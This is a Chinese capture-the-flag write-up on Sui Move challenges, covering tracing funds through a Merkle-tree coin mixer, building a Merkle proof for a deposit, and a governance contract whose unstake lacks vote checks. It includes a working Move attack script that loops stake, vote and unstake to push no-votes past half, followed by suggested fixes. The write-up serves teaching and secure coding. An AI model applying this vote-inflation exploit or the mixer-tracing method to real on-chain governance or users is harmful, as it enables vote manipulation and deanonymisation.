# sui_basecamp_ctf(1)-先知社区

> **来源**: https://xz.aliyun.com/news/18917  
> **文章ID**: 18917

---

# Suinado Cash

分析代码文件，得知其是一个基于merkle\_tree实现的一个混币器合约

## 基本概念

### 混币器

混币器，英文称为 CoinJoin 或 Cryptocurrency Tumbler，是一种旨在增强加密货币（如比特币）交易隐私性的服务或协议，核心目的是切断发送地址和接收地址之间的直接联系，从而混淆交易路径，使得外界难以追踪资金的来源和去向。

### merkle\_tree

Merkle树（默克尔树）是一种密码学技术，它像“数字指纹”一样，用一小段数据（根哈希）来高效、安全地验证大量数据的完整性和一致性。

特点  
叶子节点：最底层，是每个原始数据块的哈希值（比如文件分成很多小块，每小块生成一个指纹）。

树根：最顶层的那个节点，叫 Merkle根。它是所有数据的唯一代表。

优势  
根据树根和各个非叶子节点的哈希值可快速定位到哪个叶子节点数据发生了修改

图例

```
                ┌───────────────────────┐
                │       Merkle Root     │
                │        (HashABCD)     │
                └───────────┬───────────┘
               ┌────────────┴────────────┐
        ┌──────┴───────┐         ┌───────┴──────┐
        │  HashAB      │         │   HashCD     │
        │ (HashA+HashB)│         │ (HashC+HashD)│
        └──────┬───────┘         └───────┬──────┘
        ┌──────┴───────┐         ┌───────┴──────┐
    ┌───┴───┐      ┌───┴───┐ ┌───┴───┐      ┌───┴───┐
    │ HashA │      │ HashB │ │ HashC │      │ HashD │
    │ (TxA) │      │ (TxB) │ │ (TxC) │      │ (TxD) │
    └───┬───┘      └───┬───┘ └───┬───┘      └───┬───┘
    ┌───┴───┐      ┌───┴───┐ ┌───┴───┐      ┌───┴───┐
    │  TxA  │      │  TxB  │ │  TxC  │      │  TxD  │
    └───────┘      └───────┘ └───────┘      └───────┘
(原始交易数据)    (原始交易数据) (原始交易数据)    (原始交易数据)
```

## 代码解析

这一道题的目的是破解这个混币器，分析出这笔资金的去向，我们可以注意到这一部分代码

```
entry public deposit(Arg0: &mut Mixer, Arg1: Coin<SUI>, Arg2: vector<u8>, Arg3: &mut TxContext) {
L4:	loc0: Balance<SUI>
B0:
    0: ImmBorrowLoc[1](Arg1: Coin<SUI>)
    1: Call coin::value<SUI>(&Coin<SUI>): u64
    2: CopyLoc[0](Arg0: &mut Mixer)
    3: ImmBorrowField[0](Mixer.denomination: u64)
    4: ReadRef
    5: Ge
    6: BrFalse(8)
B1:
    7: Branch(14)
B2:
    8: MoveLoc[0](Arg0: &mut Mixer)
    9: Pop
    10: MoveLoc[3](Arg3: &mut TxContext)
    11: Pop
    12: LdConst[1](u64: 1)
    13: Abort
B3:
    14: MutBorrowLoc[1](Arg1: Coin<SUI>)
    15: CopyLoc[0](Arg0: &mut Mixer)
    16: ImmBorrowField[0](Mixer.denomination: u64)
    17: ReadRef
    18: CopyLoc[3](Arg3: &mut TxContext)
    19: Call coin::split<SUI>(&mut Coin<SUI>, u64, &mut TxContext): Coin<SUI>
    20: Call coin::into_balance<SUI>(Coin<SUI>): Balance<SUI>
    21: StLoc[4](loc0: Balance<SUI>)
    22: CopyLoc[0](Arg0: &mut Mixer)
    23: MutBorrowField[1](Mixer.funds: Balance<SUI>)
    24: MoveLoc[4](loc0: Balance<SUI>)
    25: Call balance::join<SUI>(&mut Balance<SUI>, Balance<SUI>): u64
    26: Pop
    27: MoveLoc[1](Arg1: Coin<SUI>)
    28: CopyLoc[3](Arg3: &mut TxContext)
    29: FreezeRef
    30: Call tx_context::sender(&TxContext): address
    31: Call transfer::public_transfer<Coin<SUI>>(Coin<SUI>, address)
    32: MoveLoc[0](Arg0: &mut Mixer)
    33: MutBorrowField[2](Mixer.tree: MerkleTree)
    34: CopyLoc[2](Arg2: vector<u8>)
    35: Call merkle_tree::insert(&mut MerkleTree, vector<u8>): u64
    36: Pop
    37: MoveLoc[3](Arg3: &mut TxContext)
    38: FreezeRef
    39: Call tx_context::sender(&TxContext): address
    40: MoveLoc[2](Arg2: vector<u8>)
    41: Pack[1](DepositEvent)
    42: Call event::emit<DepositEvent>(DepositEvent)
    43: Ret
}
```

```
entry public withdraw(Arg0: &mut Mixer, Arg1: u64, Arg2: u64, Arg3: vector<u8>, Arg4: vector<vector<u8>>, Arg5: u64, Arg6: address, Arg7: &mut TxContext) {
L8:	loc0: vector<u8>
L9:	loc1: vector<u8>
L10:	loc2: vector<u8>
L11:	loc3: u64
L12:	loc4: vector<u8>
B0:
    0: CopyLoc[0](Arg0: &mut Mixer)
    1: ImmBorrowField[1](Mixer.funds: Balance<SUI>)
    2: Call balance::value<SUI>(&Balance<SUI>): u64
    3: CopyLoc[0](Arg0: &mut Mixer)
    4: ImmBorrowField[0](Mixer.denomination: u64)
    5: ReadRef
    6: Ge
    7: BrFalse(9)
B1:
    8: Branch(15)
B2:
    9: MoveLoc[0](Arg0: &mut Mixer)
    10: Pop
    11: MoveLoc[7](Arg7: &mut TxContext)
    12: Pop
    13: LdConst[4](u64: 4)
    14: Abort
B3:
    15: ImmBorrowLoc[1](Arg1: u64)
    16: Call bcs::to_bytes<u64>(&u64): vector<u8>
    17: StLoc[8](loc0: vector<u8>)
    18: ImmBorrowLoc[8](loc0: vector<u8>)
    19: Call hash::blake2b256(&vector<u8>): vector<u8>
    20: StLoc[12](loc4: vector<u8>)
    21: LdU64(0)
    22: StLoc[11](loc3: u64)
B4:
    23: CopyLoc[11](loc3: u64)
    24: CopyLoc[0](Arg0: &mut Mixer)
    25: ImmBorrowField[3](Mixer.withdrawn_nullifiers: vector<vector<u8>>)
    26: VecLen(14)
    27: Lt
    28: BrFalse(49)
B5:
    29: CopyLoc[0](Arg0: &mut Mixer)
    30: ImmBorrowField[3](Mixer.withdrawn_nullifiers: vector<vector<u8>>)
    31: CopyLoc[11](loc3: u64)
    32: VecImmBorrow(14)
    33: ReadRef
    34: CopyLoc[12](loc4: vector<u8>)
    35: Neq
    36: BrFalse(38)
B6:
    37: Branch(44)
B7:
    38: MoveLoc[0](Arg0: &mut Mixer)
    39: Pop
    40: MoveLoc[7](Arg7: &mut TxContext)
    41: Pop
    42: LdConst[3](u64: 3)
    43: Abort
B8:
    44: MoveLoc[11](loc3: u64)
    45: LdU64(1)
    46: Add
    47: StLoc[11](loc3: u64)
    48: Branch(23)
B9:
    49: VecPack(31, 0)
    50: StLoc[9](loc1: vector<u8>)
    51: MutBorrowLoc[9](loc1: vector<u8>)
    52: ImmBorrowLoc[1](Arg1: u64)
    53: Call bcs::to_bytes<u64>(&u64): vector<u8>
    54: Call vector::append<u8>(&mut vector<u8>, vector<u8>)
    55: MutBorrowLoc[9](loc1: vector<u8>)
    56: ImmBorrowLoc[2](Arg2: u64)
    57: Call bcs::to_bytes<u64>(&u64): vector<u8>
    58: Call vector::append<u8>(&mut vector<u8>, vector<u8>)
    59: ImmBorrowLoc[9](loc1: vector<u8>)
    60: Call hash::blake2b256(&vector<u8>): vector<u8>
    61: StLoc[10](loc2: vector<u8>)
    62: CopyLoc[0](Arg0: &mut Mixer)
    63: ImmBorrowField[2](Mixer.tree: MerkleTree)
    64: CopyLoc[5](Arg5: u64)
    65: Call merkle_tree::leaf_at(&MerkleTree, u64): vector<u8>
    66: CopyLoc[10](loc2: vector<u8>)
    67: Eq
    68: BrFalse(70)
B10:
    69: Branch(76)
B11:
    70: MoveLoc[0](Arg0: &mut Mixer)
    71: Pop
    72: MoveLoc[7](Arg7: &mut TxContext)
    73: Pop
    74: LdConst[5](u64: 5)
    75: Abort
B12:
    76: CopyLoc[0](Arg0: &mut Mixer)
    77: ImmBorrowField[2](Mixer.tree: MerkleTree)
    78: ImmBorrowLoc[3](Arg3: vector<u8>)
    79: Call merkle_tree::is_known_root(&MerkleTree, &vector<u8>): bool
    80: BrFalse(82)
B13:
    81: Branch(88)
B14:
    82: MoveLoc[0](Arg0: &mut Mixer)
    83: Pop
    84: MoveLoc[7](Arg7: &mut TxContext)
    85: Pop
    86: LdConst[2](u64: 2)
    87: Abort
B15:
    88: CopyLoc[0](Arg0: &mut Mixer)
    89: ImmBorrowField[2](Mixer.tree: MerkleTree)
    90: ImmBorrowLoc[3](Arg3: vector<u8>)
    91: ImmBorrowLoc[10](loc2: vector<u8>)
    92: MoveLoc[5](Arg5: u64)
    93: ImmBorrowLoc[4](Arg4: vector<vector<u8>>)
    94: Call merkle_tree::verify_proof(&MerkleTree, &vector<u8>, &vector<u8>, u64, &vector<vector<u8>>): bool
    95: BrFalse(97)
B16:
    96: Branch(103)
B17:
    97: MoveLoc[0](Arg0: &mut Mixer)
    98: Pop
    99: MoveLoc[7](Arg7: &mut TxContext)
    100: Pop
    101: LdConst[2](u64: 2)
    102: Abort
B18:
    103: CopyLoc[0](Arg0: &mut Mixer)
    104: MutBorrowField[3](Mixer.withdrawn_nullifiers: vector<vector<u8>>)
    105: MoveLoc[12](loc4: vector<u8>)
    106: VecPushBack(14)
    107: CopyLoc[0](Arg0: &mut Mixer)
    108: MutBorrowField[1](Mixer.funds: Balance<SUI>)
    109: MoveLoc[0](Arg0: &mut Mixer)
    110: ImmBorrowField[0](Mixer.denomination: u64)
    111: ReadRef
    112: Call balance::split<SUI>(&mut Balance<SUI>, u64): Balance<SUI>
    113: MoveLoc[7](Arg7: &mut TxContext)
    114: Call coin::from_balance<SUI>(Balance<SUI>, &mut TxContext): Coin<SUI>
    115: CopyLoc[6](Arg6: address)
    116: Call transfer::public_transfer<Coin<SUI>>(Coin<SUI>, address)
    117: MoveLoc[6](Arg6: address)
    118: Pack[2](WithdrawalEvent)
    119: Call event::emit<WithdrawalEvent>(WithdrawalEvent)
    120: Ret
}
```

这是题目给出的存款函数和取款函数，注意到这里存在一个问题：这个混币器的基本merkle\_tree是只有16个叶子节点，而且这里面是直接按顺序存储在叶子节点里，所以这个混币器里面只要在区块链浏览器里查看一下就可以直接获取到这笔存款的位置。同时在withdraw函数的入参里有一个参数指定了取款的叶子节点(0~15)也即在区块链浏览器观察这笔款项所在的叶子节点和在该叶子节点取款的操作对应的地址，就可以直接获取到这笔款项去向的地址，实现get flag。

# Proof of Commitment

为交易中的存款生成有效的证明：FcxC5Tuq4hv5WvbSdfPqPEvs165HraWqRup5fbCme8fj。最终的标志应该遵循以下格式：SBC{0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,...0xzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz}

题目环境需要自行添加

```
sui client new-env --alias mynode --rpc http://85.120.206.56:9000
```

然后切换为对应环境

```
sui client switch --env mynode
```

然后参照以下的证明构建函数写一个脚本自行构建证明就好了

```
public build_proof(Arg0: &MerkleTree, Arg1: u64): vector<vector<u8>> {
L2:	loc0: u64
L3:	loc1: u64
L4:	loc2: u8
L5:	loc3: vector<vector<u8>>
L6:	loc4: vector<u8>
L7:	loc5: u64
B0:
    0: CopyLoc[1](Arg1: u64)
    1: CopyLoc[0](Arg0: &MerkleTree)
    2: ImmBorrowField[0](MerkleTree.leaf_count: u64)
    3: ReadRef
    4: Lt
    5: BrFalse(7)
B1:
    6: Branch(11)
B2:
    7: MoveLoc[0](Arg0: &MerkleTree)
    8: Pop
    9: LdU64(4)
    10: Abort
B3:
    11: VecPack(1, 0)
    12: StLoc[5](loc3: vector<vector<u8>>)
    13: CopyLoc[0](Arg0: &MerkleTree)
    14: ImmBorrowField[2](MerkleTree.nodes: vector<vector<u8>>)
    15: VecLen(1)
    16: CastU64
    17: CopyLoc[0](Arg0: &MerkleTree)
    18: ImmBorrowField[1](MerkleTree.max_leaves: u64)
    19: ReadRef
    20: Sub
    21: MoveLoc[1](Arg1: u64)
    22: Add
    23: StLoc[3](loc1: u64)
    24: LdU8(0)
    25: StLoc[4](loc2: u8)
B4:
    26: CopyLoc[4](loc2: u8)
    27: CopyLoc[0](Arg0: &MerkleTree)
    28: ImmBorrowField[4](MerkleTree.tree_depth: u8)
    29: ReadRef
    30: Lt
    31: BrFalse(70)
B5:
    32: CopyLoc[3](loc1: u64)
    33: LdU64(2)
    34: Mod
    35: LdU64(0)
    36: Eq
    37: BrFalse(44)
B6:
    38: Branch(39)
B7:
    39: CopyLoc[3](loc1: u64)
    40: LdU64(1)
    41: Sub
    42: StLoc[2](loc0: u64)
    43: Branch(48)
B8:
    44: CopyLoc[3](loc1: u64)
    45: LdU64(1)
    46: Add
    47: StLoc[2](loc0: u64)
B9:
    48: MoveLoc[2](loc0: u64)
    49: StLoc[7](loc5: u64)
    50: CopyLoc[0](Arg0: &MerkleTree)
    51: ImmBorrowField[2](MerkleTree.nodes: vector<vector<u8>>)
    52: MoveLoc[7](loc5: u64)
    53: VecImmBorrow(1)
    54: ReadRef
    55: StLoc[6](loc4: vector<u8>)
    56: MutBorrowLoc[5](loc3: vector<vector<u8>>)
    57: MoveLoc[6](loc4: vector<u8>)
    58: VecPushBack(1)
    59: MoveLoc[3](loc1: u64)
    60: LdU64(1)
    61: Sub
    62: LdU64(2)
    63: Div
    64: StLoc[3](loc1: u64)
    65: MoveLoc[4](loc2: u8)
    66: LdU8(1)
    67: Add
    68: StLoc[4](loc2: u8)
    69: Branch(26)
B10:
    70: MoveLoc[0](Arg0: &MerkleTree)
    71: Pop
    72: MoveLoc[5](loc3: vector<vector<u8>>)
    73: Ret
}
```

以下是证明的计算部分  
和给出的证明方法相同，首先是从节点列表中获取兄弟节点的哈希值，并将其添加到证明向量中，然后移动到父节点然后重复操作直到根节点

```
while (loc2 < tree_depth) {
        let loc0: u64;
        // Determine the sibling index based on whether loc1 is even or odd
        if (loc1 % 2 == 0) {
            loc0 = loc1 - 1;
        } else {
            loc0 = loc1 + 1;
        };

        // Get the sibling node value and add it to the proof
        let node_ref = vector::borrow(&merkle_tree.nodes, loc0);
        let node_val = copy *node_ref;
        vector::push_back(&mut proof, node_val);

        // Move to the parent index
        loc1 = (loc1 - 1) / 2;
        loc2 = loc2 + 1;
    };
```

获取对应树的方法

```
sui client object address --json > out.json
```

# ghost\_vote

## 分析代码

### 获胜条件

```
public fun is_solved(challenge: &Challenge<COIN>) {
    let proposal = challenge.governance.get_proposal(GET_PROPOSAL_INDEX_TO_DECLINE());
    let solved =
        !proposal.is_open() && proposal.no_votes() > challenge.governance.get_balance() / 2;
    assert!(solved);
}
```

如上，要求no\_votes大于一半票权且投票已经结束

### 投票函数

```
public fun vote<C>(self: &mut Governance<C>, proposal_index: u64, yes: bool, ctx: &mut TxContext) {
    let proposal = &mut self.proposals[proposal_index];
    assert!(proposal.is_open);

    let user = ctx.sender();
    assert!(self.stakes.contains(user));
    let vote_power = *self.stakes.borrow(user);

    proposal.voted.push_back(user);
    if (yes) {
        proposal.yes_votes = proposal.yes_votes + vote_power;
    } else {
        proposal.no_votes = proposal.no_votes + vote_power;
        if (proposal.no_votes > self.balance.value() / 2) {
            proposal.is_open = false;
        };
    };
}
```

### 质押相关函数

```
public fun stake<C>(self: &mut Governance<C>, deposit: Coin<C>, ctx: &TxContext) {
    self.stake_for(ctx.sender(), deposit);
}

public fun stake_for<C>(self: &mut Governance<C>, user: address, deposit: Coin<C>) {
    let amount = deposit.value();
    assert!(amount > 0);

    if (self.stakes.contains(user)) {
        let stake_amount = self.stakes.borrow_mut(user);
        *stake_amount = *stake_amount + amount;
    } else {
        self.stakes.add(user, amount);
    };

    self.balance.join(deposit.into_balance());
}

public fun unstake<C>(self: &mut Governance<C>, ctx: &mut TxContext): Coin<C> {
    let user = ctx.sender();
    assert!(self.stakes.contains(user));

    let amount = self.stakes.remove(user);
    coin::from_balance(self.balance.split(amount), ctx)
}
```

## 攻击方法：

注意到在解除质押的时候并没有一个验证机制来验证是否已经投过票，因此可以实现一个路径：质押--》投票--》解质押--》质押--》投票…… 从而在质押值(票权总值)不增加的情形下实现no\_票权增多直到达到>50%的总票权

攻击脚本

```
module the_solution::solution;

use challenge::challenge::{Challenge, GET_PROPOSAL_INDEX_TO_DECLINE};
use challenge::coin::COIN;

public fun solve(challenge: &mut Challenge<COIN>, ctx: &mut TxContext) {
    let mut coins = challenge.claim_coin(ctx);
    while (true) {
        challenge.get_governance().stake(coins, ctx);
        challenge.get_governance().vote(GET_PROPOSAL_INDEX_TO_DECLINE(), false, ctx);
        coins = challenge.get_governance().unstake(ctx);
        if(challenge.get_governance().get_proposal(GET_PROPOSAL_INDEX_TO_DECLINE()).is_open() == false) {
            break
        }
    };
    challenge.get_governance().stake(coins, ctx);
}
```

### 修复建议

1.在Proposal添加yes\_voters 和 no\_voters 两个表，用于记录投票用户地址  
2.添加delete\_vote函数实现在unstake时删除投票功能  
3.增加各个函数的验证

添加表记录用户地址

```
public struct Proposal has key, store {
    id: UID,
    description: vector<u8>,
    yes_votes: u64,
    no_votes: u64,
    yes_voters: Table<address, u64>, // 记录投赞成票的用户及其投票权
    no_voters: Table<address, u64>,  // 记录投反对票的用户及其投票权
    is_open: bool,
}
```

添加删除投票功能

```
/// 内部函数：删除用户在指定提案中的投票
fun delete_vote(proposal: &mut Proposal, user: address) {
    if (table::contains(&proposal.yes_voters, user)) {
        let vote_power = table::remove(&mut proposal.yes_voters, user);
        proposal.yes_votes = proposal.yes_votes - vote_power;
    };
    if (table::contains(&proposal.no_voters, user)) {
        let vote_power = table::remove(&mut proposal.no_voters, user);
        proposal.no_votes = proposal.no_votes - vote_power;
    };
}

/// 内部函数：删除用户在所有提案中的投票
fun delete_votes(proposals: &mut vector<Proposal>, user: address) {
    let i = 0;
    let length = vector::length(proposals);
    while (i < length) {
        let proposal = vector::borrow_mut(proposals, i);
        delete_vote(proposal, user);
        i = i + 1;
    };
}
```

解质押时删除已投的票

```
public fun unstake<C>(self: &mut Governance<C>, ctx: &mut TxContext): Coin<C> {
    let user = ctx.sender();
    assert!(self.stakes.contains(user));

    let amount = self.stakes.remove(user);
    
    // 调用内部函数删除用户在所有提案中的投票
    delete_votes(&mut self.proposals, user);
    
    coin::from_balance(self.balance.split(amount), ctx)
}
```

vote函数添加验证

```
public fun vote<C>(self: &mut Governance<C>, proposal_index: u64, yes: bool, ctx: &mut TxContext) {
    let proposal = &mut self.proposals[proposal_index];
    assert!(proposal.is_open);

    let user = ctx.sender();
    assert!(self.stakes.contains(user));
    let vote_power = *self.stakes.borrow(user);

    // 检查用户是否已经投票
    assert!(!table::contains(&proposal.yes_voters, user), EAlreadyVoted);
    assert!(!table::contains(&proposal.no_voters, user), EAlreadyVoted);

    if (yes) {
        table::add(&mut proposal.yes_voters, user, vote_power);
        proposal.yes_votes = proposal.yes_votes + vote_power;
    } else {
        table::add(&mut proposal.no_voters, user, vote_power);
        proposal.no_votes = proposal.no_votes + vote_power;
        if (proposal.no_votes > self.balance.value() / 2) {
            proposal.is_open = false;
        };
    };
}
```
